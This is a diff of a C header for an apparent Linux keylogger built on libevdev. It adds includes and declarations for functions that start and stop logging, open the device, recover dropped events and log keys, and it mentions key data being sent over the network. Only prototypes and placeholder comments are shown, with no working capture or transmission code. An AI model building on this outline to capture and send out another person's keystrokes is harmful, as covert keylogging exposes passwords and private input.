@@ -1,4 +1,19 @@
-// #pragma once
+#pragma once
+
+#define _POSIX_SOURCE
+#include <ctype.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <libevdev/libevdev.h>
+#include <pthread.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
 
 /**
  * Represents all the data that is sent over the network
@@ -31,4 +46,21 @@ void begin_keylogger(void);
  */
 void end_keylogger(void);
 
-int keylogger_test_1(void);
+/**
+ * Documentation here
+ */
+void log_device(void);
+
+/**
+ * Documentation here
+ * 
+ * If the device sends events faster than can be read, the kernel buffers will
+ * fill up and the kernel will skip events. This function resyncs the device
+ * and updates the internal state before reading events again
+ */
+void handle_syn_dropped(struct libevdev* dev);
+
+/**
+ * Documentation here
+ */
+void log_keys(void);
